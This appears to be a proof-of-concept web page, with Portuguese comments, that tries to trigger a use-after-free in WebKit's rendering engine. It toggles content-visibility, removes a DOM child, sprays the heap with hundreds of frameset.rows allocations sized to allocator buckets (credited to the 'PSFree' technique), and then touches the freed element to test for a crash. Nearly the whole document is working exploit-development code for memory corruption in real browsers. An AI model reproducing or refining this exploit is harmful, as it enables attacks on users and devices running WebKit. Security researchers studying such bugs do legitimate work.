<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit UaF Crash Test (Smart Spray)</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; padding: 20px; }
        .container { 
            border: 2px dashed #333; 
            padding: 20px; 
            margin-bottom: 20px; 
            background: #fff;
        }
        .child { 
            width: 100px; 
            height: 100px; 
            background-color: blue; 
            border: 2px solid darkblue;
        }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #d32f2f; color: white; border: none; }
        button:hover { background-color: #b71c1c; }
        #log-area { margin-top: 20px; border-top: 1px solid #ccc; padding-top: 10px; white-space: pre-wrap; height: 300px; overflow-y: scroll; background: #e0e0e0;}
    </style>
</head>
<body>

    <h2>WebKit UaF: Smart Frameset Spray</h2>
    <p>Tenta corromper o RenderLayer usando alocação via Frameset (Técnica PSFree).</p>
    <button onclick="runExploit()">TENTAR CRASH (Iniciar PoC)</button>

    <div class="container">
        <div class="child"></div>
    </div>

    <div id="log-area"><h3>Logs:</h3></div>

<script>
/* ==========================================
   UTILITÁRIOS
   ========================================== */

function debug_log(msg) {
    let time = new Date().toLocaleTimeString();
    let textNode = document.createTextNode(`[${time}] ${msg}`);
    let p = document.createElement("p");
    p.appendChild(textNode);
    let logArea = document.getElementById("log-area") || document.body;
    logArea.appendChild(p);
    p.scrollIntoView(); 
    // console.log(msg); // Opcional
}

/* ==========================================
   LÓGICA DE SPRAY (Técnica PSFree / Frameset)
   ========================================== */

// Mantemos referências globais para evitar que o Garbage Collector limpe nosso spray
let globalSprays = [];

function sprayFastMalloc(sizeInBytes) {
    // No WebKit, alocações são arredondadas para "Buckets" (ex: 16, 32, 64, 128...).
    // Usamos 'frameset.rows' para alocar um UniqueArray<Length>.
    // Cada 'Length' ocupa 8 bytes. O array tem um cabeçalho (geralmente 8 ou 16 bytes).
    // Fórmula aproximada do PSFree: vírgulas = (bytes / 8) - 2
    
    const structSize = 8; 
    let commasCount = Math.floor(sizeInBytes / structSize) - 2;
    if (commasCount < 1) commasCount = 1;

    const commas = ",".repeat(commasCount);
    
    let chunk = [];
    // Criamos 500 framesets para ESSE tamanho específico
    for(let i = 0; i < 500; i++) {
        let f = document.createElement('frameset');
        f.rows = commas; // Isso dispara a alocação no fastMalloc
        chunk.push(f);
    }
    return chunk;
}

function heapSpray() {
  debug_log(">>> Iniciando Smart Spray (Framesets)...");
  
  // Lista de tamanhos prováveis para objetos RenderLayer ou seus vetores internos.
  // Em vez de "aleatório" puro, atacamos os Buckets de alocação.
  // Se o objeto tiver 130 bytes, ele cai no balde de 256. Se tiver 40, no de 64.
  const sizesToTry = [32, 48, 64, 96, 128, 192, 256, 512, 1024, 2048, 4096];
  
  // Limpa sprays antigos (opcional, dependendo da estratégia)
  globalSprays = [];

  for (let size of sizesToTry) {
      // debug_log(`Spraying bucket: ${size} bytes...`);
      // Adiciona ao array global para persistir na memória
      globalSprays.push(sprayFastMalloc(size));
  }
  
  // Adiciona um pouco de "aleatoriedade" extra como solicitado
  for(let i=0; i<5; i++) {
      let randomSize = Math.floor(Math.random() * 2000) + 32;
      globalSprays.push(sprayFastMalloc(randomSize));
  }

  debug_log(`>>> Spray concluído. Memória preenchida com ${globalSprays.length * 500} framesets.`);
}

/* ==========================================
   LÓGICA DO EXPLOIT (UaF Trigger)
   ========================================== */

let container;
let child;

function initDomElements() {
    container = document.querySelector(".container");
    child = document.querySelector(".child");
}

function triggerUAF() {
  if(!container || !child) {
      initDomElements();
      if(!child) { 
          debug_log("Recriando elemento filho...");
          child = document.createElement("div");
          child.className = "child";
          container.appendChild(child);
      }
  }

  // 1. Preparar: Esconde o pai (dirty state)
  debug_log("1. content-visibility: hidden");
  container.style.contentVisibility = "hidden";
  
  // 2. Free: Remove o filho
  debug_log("2. Removendo filho (Free)");
  child.remove();
  
  // 3. Race: Tenta ocupar o espaço antes da recomputação
  setTimeout(() => {
    debug_log("3. Trigger Recompute (Auto) + Spray Imediato");
    
    // O pulo do gato: A mudança de estilo dispara o re-layout.
    // O Spray tenta rodar exatamente quando o RenderLayer velho está sendo acessado.
    container.style.contentVisibility = "auto";
    
    // Inunda a memória AGORA
    heapSpray();
    
    debug_log("!!! Verificando Crash !!!");
    
    // --- CHECK DE CRASH ---
    try {
        // Se o RenderLayer do 'child' foi substituído por lixo (nossos framesets),
        // acessar geometria ou texto deve fazer o WebKit se perder nos ponteiros e travar.
        let width = child.getBoundingClientRect().width;
        let txt = child.innerText; 
        
        debug_log("❌ FALHA: O navegador não travou.");
        debug_log("Info: O objeto provavelmente foi limpo ou o tamanho do spray está errado.");
        debug_log(`Leitura segura: ${width}px`);
        
    } catch(e) {
        debug_log("⚠️ Erro JS: " + e.message);
    }
    // ----------------------
    
  }, 0);
}

const observer = new MutationObserver(() => {
  // Observer desativado para evitar loop infinito durante o teste manual
});

function runExploit() {
    initDomElements();
    observer.observe(container, { childList: true, subtree: true });
    
    debug_log("Iniciando sequência...");
    triggerUAF();
}

</script>
</body>
</html>
